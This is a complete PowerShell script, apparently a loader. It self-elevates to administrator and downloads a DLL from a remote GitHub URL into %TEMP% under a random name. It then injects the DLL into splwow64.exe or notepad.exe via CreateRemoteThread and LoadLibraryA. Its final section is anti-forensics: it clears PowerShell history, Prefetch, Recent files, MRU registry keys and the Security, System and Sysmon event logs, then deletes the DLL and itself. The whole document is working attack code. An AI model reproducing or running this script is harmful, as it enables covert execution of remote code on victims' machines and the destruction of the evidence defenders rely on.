# === Self-Elevate ===
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        Start-Process powershell.exe -Verb RunAs -ArgumentList (
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-File `"$PSCommandPath`""
        )
        exit
    }
    catch {
        Write-Host "Failed to request Admin privileges: $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# === Fixed LookupFunc ===
function LookupFunc {
    Param ($moduleName, $functionName)
    
    $signature = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
'@
    
    # Check if type already exists to avoid errors on re-run within same session
    if (-not ([System.Management.Automation.PSTypeName]'Win32.Kernel32').Type) {
        $kernel32 = Add-Type -MemberDefinition $signature -Name 'Kernel32' -Namespace 'Win32' -PassThru
    } else {
        $kernel32 = [Win32.Kernel32]
    }
    
    $hModule = $kernel32::GetModuleHandle($moduleName)
    return $kernel32::GetProcAddress($hModule, $functionName)
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )
    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# === 1. Clear Temp Folder ===
Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
$tempDir = $env:TEMP
try {
    # Remove all files and subdirectories in Temp. 
    # -Recurse -Force is needed. ErrorAction SilentlyContinue ignores locked files.
    Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temp cleared." -ForegroundColor Green
}
catch {
    Write-Host "[!] Warning: Could not fully clear temp (files might be in use). Continuing..." -ForegroundColor Yellow
}

# === 2. Download DLL to %TEMP% with Random Name ===
# Generate a random filename using GUID + .tmp extension
$randomGuid = [System.Guid]::NewGuid().ToString()
$dllFileName = "$randomGuid.tmp"

# Force path to TEMP
$dllPath = Join-Path $env:TEMP $dllFileName
$dllUrl = "https://raw.githubusercontent.com/fourtikeeree-wq/silvex1/main/NOVA_Premuim.dll"

try {
    # Use WebClient or Invoke-WebRequest. WebClient is often quieter.
    $webClient = New-Object System.Net.WebClient
    # Optional: Add a user agent if the server blocks default PowerShell agents
    # $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
    $webClient.DownloadFile($dllUrl, $dllPath)
    $webClient.Dispose()
    
    if (Test-Path $dllPath) {
        Write-Host "[+] Download successful." -ForegroundColor Green
    } else {
        throw "File not found after download."
    }
}
catch {
    Write-Host "[!] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# === Launch Target Process (splwow64.exe with notepad.exe fallback) ===
$primaryExe = "splwow64.exe"
$fallbackExe = "notepad.exe"
$targetExe = $primaryExe
$targetProcess = "splwow64"
$proc = $null

Write-Host ""
Write-Host "[+] Attempting to launch $primaryExe..." -ForegroundColor Yellow

# --- Try Primary Target: splwow64.exe ---
try {
    # ตรวจสอบว่าไฟล์มีอยู่ในระบบหรือไม่
    $primaryPath = Get-Command $primaryExe -ErrorAction SilentlyContinue
    if ($primaryPath) {
        $proc = Start-Process -FilePath $primaryExe -WindowStyle Normal -PassThru -ErrorAction SilentlyContinue
    }
    
    if ($proc) {
        Start-Sleep -Seconds 2
        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Host "[!] Error launching $primaryExe : $($_.Exception.Message)" -ForegroundColor Yellow
}

# --- Fallback to notepad.exe if primary failed ---
if (-not $proc) {
    Write-Host "[!] Failed to start $primaryExe, falling back to $fallbackExe..." -ForegroundColor Yellow
    try {
        $proc = Start-Process -FilePath $fallbackExe -WindowStyle Normal -PassThru -ErrorAction Stop
        $targetProcess = "notepad"
        $targetExe = $fallbackExe
        
        Start-Sleep -Seconds 2
        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        
        if (-not $proc) {
            Write-Host "[!] Fallback process exited prematurely" -ForegroundColor Red
            exit 1
        }
        Write-Host "[+] Successfully launched fallback: $fallbackExe" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to start fallback $fallbackExe : $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}
else {
    Write-Host "[+] Successfully launched: $primaryExe" -ForegroundColor Green
}

$pid1 = $proc.Id
Write-Host "[+] Target: $targetProcess (PID: $pid1) [Admin Context]" -ForegroundColor Green

# === Injection ===
try {
    $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll OpenProcess),
        (getDelegateType @([UInt32], [UInt32], [Int]) ([IntPtr]))
    )
    
    $VirtualAllocExDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
    )
    
    $WriteProcessMemoryDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))
    )
    
    $LoadLibraryADelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll LoadLibraryA),
        (getDelegateType @([String]) ([IntPtr]))
    )
    
    $CreateRemoteThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
    )
    
    # PROCESS_ALL_ACCESS (0x001F0FFF)
    $hProcess = $OpenProcessDelegate.Invoke(0x001F0FFF, 0, $pid1)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to open process handle. Access Denied?" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Process Handle: $hProcess" -ForegroundColor Green
    
    # Allocate memory for the DLL path string
    $addr = $VirtualAllocExDelegate.Invoke($hProcess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    if ($addr -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Allocated Memory: $addr" -ForegroundColor Green
    
    # Convert DLL path to bytes
    [Byte[]]$dllNameBytes = [Text.Encoding]::ASCII.GetBytes($dllPath + "`0")
    [IntPtr]$outSize = [IntPtr]::Zero
    
    # Write DLL path to remote process
    $res = $WriteProcessMemoryDelegate.Invoke($hProcess, $addr, $dllNameBytes, $dllNameBytes.Length, $outSize)
    
    if (-not $res) {
        Write-Host "[!] Failed to write memory" -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Memory Written: $res" -ForegroundColor Green
    
    $loadLibAddr = LookupFunc kernel32.dll LoadLibraryA
    Write-Host "[+] LoadLibraryA Address: $loadLibAddr" -ForegroundColor Green
    
    # Create remote thread to load the DLL
    $hThread = $CreateRemoteThreadDelegate.Invoke($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $addr, 0, [IntPtr]::Zero)
    
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[✓] Injection successful (Thread Handle: $hThread)" -ForegroundColor Green
    } else {
        Write-Host "[!] Injection failed (CreateRemoteThread returned Zero)" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
}

# === Enhanced Cleanup & Anti-Forensics ===
Write-Host "[+] Starting deep cleanup..." -ForegroundColor Cyan

# 1. Clear PowerShell History (Memory & File Content)
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}

# 2. Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# 3. Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 4. Clear Prefetch (Multiple Attempts to Catch Re-created Files)
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 5. Clear INetCache (IE/Edge Cache)
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# 6. Clear Temp Folder Again (in case anything was recreated)
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# 7. Clear Registry MRU Keys (User-specific)
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

# 8. Clear Event Logs (Requires Admin)
$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Sysmon/Operational")
foreach ($logName in $logNames) {
    try {
        wevtutil cl $logName 2>$null
    } catch {
        # Ignore errors if log doesn't exist or access denied
    }
}

# 9. Delete the random DLL from Temp
Start-Sleep -Seconds 1
if (Test-Path $dllPath) { 
    try { Remove-Item $dllPath -Force -ErrorAction SilentlyContinue } catch {}
}

# 10. Delete the script itself
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
}

# 11. Force GC and wait a bit to let system settle
[GC]::Collect()
Start-Sleep -Seconds 2

exit
